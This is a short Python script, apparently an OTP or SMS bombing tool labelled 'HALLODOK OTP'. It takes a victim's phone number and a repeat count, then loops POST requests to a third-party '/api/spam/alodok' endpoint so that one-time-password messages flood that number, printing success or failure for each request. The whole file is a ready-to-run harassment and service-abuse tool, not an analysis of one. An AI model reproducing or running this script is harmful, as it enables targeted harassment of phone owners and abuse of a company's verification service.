
import requests, time

print("""
	[ HALLODOK OTP ]
	    -DemoNZxx-
""")

num=input("[In] number: ")
jum=int(input("[In] amount: "))

print("\n[RESULT]")
for x in range(jum):
	try:
		req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok",
			data={"number":num})
		if req.json()['status'] == 'ok':
			print(f"{x+1}. Succsess {num}")
		else:
			print(f"{x+1}. Failed {num}")
	except Exception as e:
		print(f"{x+1}. Pass: {e}")